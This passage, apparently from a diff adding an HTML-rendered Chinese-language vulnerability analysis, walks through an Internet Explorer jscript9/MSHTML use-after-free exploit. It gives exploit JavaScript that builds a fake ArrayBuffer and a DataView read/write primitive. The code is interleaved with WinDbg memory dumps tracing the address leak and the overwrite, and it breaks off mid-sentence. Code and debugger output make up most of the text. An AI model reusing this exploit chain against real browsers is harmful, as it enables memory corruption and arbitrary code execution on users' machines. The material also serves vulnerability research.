+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VT_BYREF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_I4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pAbf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VBArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//bufArr[0] = fake,bufArr[1] = arr&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VT_BYREF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_I4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;//fakeArray&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VT_BYREF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_I4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x04&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;//fakeArray+0x4&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VT_BYREF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_I4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;//fakebuffer&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VBArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;			
+&lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vt&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gc&lt;/span&gt;					
+&lt;span class=&quot;nx&quot;&gt;fakeArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;			&lt;span class=&quot;c1&quot;&gt;//buffersize&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VT_DISPATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VBArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//abf[0]&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;DataView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//write-what-where读写原语&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;pArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addrOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行hd0.nodeValue = alloc后，此时的hd2.nodeValue读写原语会被dic1.items()替换，并赋值给hd0.nodeValue：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)	//hd0.nodeValue = alloc
+0:009&amp;gt; p
+eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
+eip=73869e6e esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec908=05cec8e0
+0:009&amp;gt; dd 0943b5b4-4	//dic1.items()已经占据了hd2.nodeValue的内存空间
+0943b5b0  0000200c 00000000 06ff1320 00000000
+0943b5c0  00000009 00000000 0963cd44 00000000
+0943b5d0  00000009 00000000 09649004 00000000
+0943b5e0  00000003 00000000 12341234 00000000
+0943b5f0  00000003 00000000 12341234 00000000
+0943b600  00000003 00000000 12341234 00000000
+0943b610  00000003 00000000 12341234 00000000
+0943b620  00000003 00000000 12341234 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;随后创建hd2.nodeValue的Uint32Array leak，该数组的作用就是将fake和arr数组的内存地址泄露出来，pAbf存放的是fake，pArr存放的是arr：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
+eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
+0:009&amp;gt; p
+eax=0c564010 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
+eip=73869e6e esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec8b0=05cec888
+0:009&amp;gt; dd 0943b5b4-4	//hd2.nodeValue
+0943b5b0  0000200c 00000000 06ff1320 00000000
+0943b5c0  00000009 00000000 0963cd44 00000000	//fake
+0943b5d0  00000009 00000000 09649004 00000000	//arr
+0943b5e0  00000003 00000000 12341234 00000000
+0943b5f0  00000003 00000000 12341234 00000000
+0943b600  00000003 00000000 12341234 00000000
+0943b610  00000003 00000000 12341234 00000000
+0943b620  00000003 00000000 12341234 00000000
+0:009&amp;gt; dd 0963cd44 L8
+0963cd44  73705654 73705638 7370562c 73705610
+0963cd54  0963fed0 05d40888 00000000 00000002
+0:009&amp;gt; dd 0963fed0 L9	//该处正是fake的内存地址
+0963fed0  7370514c 08dcc8c0 00000000 00000000
+0963fee0  00000000 00000000 00000000 05d4d338
+0963fef0  00000100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;继续执行到flush()处，原本的abf已经存放了fake所在的内存结构：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec538 ebp=05cec5a0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec588={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//flush()
+0:009&amp;gt; dd 963ff00 L9	//abf
+0963ff00  7370514c 08dcc8c0 00000000 00000000
+0963ff10  00000000 095f8ee0 0c770460 05d61fe8
+0963ff20  00020010
+0:009&amp;gt; dd 05d61fe8 L11*4	//abf中的内容，其中abf[1]中存放的值就是fake
+05d61fe8  00000000 00000000 00000000 00000000
+05d61ff8  00004003 00000000 0963cd44 00000000
+05d62008  00004003 00000000 0963cd48 00000000
+05d62018  00004003 00000000 0963cd4c 00000000
+05d62028  00004003 00000000 0963cd50 00000000
+05d62038  00004003 00000000 0963cd54 00000000
+05d62048  00004003 00000000 0963cd58 00000000
+05d62058  00004003 00000000 0963cd5c 00000000
+05d62068  00004003 00000000 0963cd60 00000000
+05d62078  00004003 00000000 0963cd64 00000000
+05d62088  00004003 00000000 0963cd68 00000000
+05d62098  00004003 00000000 0963cd6c 00000000
+05d620a8  00004003 00000000 0963cd70 00000000
+05d620b8  00004003 00000000 0963cd74 00000000
+05d620c8  00004003 00000000 0963cd78 00000000
+05d620d8  00004003 00000000 0963cd7c 00000000
+05d620e8  00004003 00000000 0963cd80 00000000
+0:009&amp;gt; dd poi(0963cd44+10) L9	//fake
+0963fed0  7370514c 08dcc8c0 00000000 00000000
+0963fee0  00000000 09609100 00000000 05d4d338
+0963fef0  00000100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;当执行到var ref = new VBArray(hd0.nodeValue)时，查看hd0的内存，发现hd0.nodeValue已经被abf覆盖：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
+eip=73869e6b esp=05cec7b0 ebp=05cec810 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec7f8={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
+eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}	//var ref = new VBArray(hd0.nodeValue)
+0:009&amp;gt; dd 05387200 L10	//hd0
+05387200  715961ec 00000001 00000001 00000008
+05387210  00000000 00000000 0a2f9cf0 00000000
+05387220  ffffffff 093b32c4 0000200c 00000000
+05387230  06ff1680 00000000 05382370 00000000
+0:009&amp;gt; du 093b32c4 
+093b32c4  &quot;handle&quot;
+0:009&amp;gt; dd 06ff1680 L4
+06ff1680  08800001 00000010 00000000 0943b5b0
+0:009&amp;gt; dd 0943b5b0		//hd0.nodeValue
+0943b5b0  0002000a 00000000 00000000 00000000
+0943b5c0  00004003 00000000 0963cd44 00000000
+0943b5d0  00004003 00000000 0963cd48 00000000
+0943b5e0  00004003 00000000 0963cd4c 00000000
+0943b5f0  00004003 00000000 0963cd50 00000000
+0943b600  00004003 00000000 0963cd54 00000000
+0943b610  00004003 00000000 0963cd58 00000000
+0943b620  00004003 00000000 0963cd5c 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;随后通过setData方法将abf[1]构造成一个ArrayBuffer结构，获取abf[1]到god中，执行到god = new DataView(ref.getItem(1))时，abf的内存结构如下：&lt;/p&gt;
+
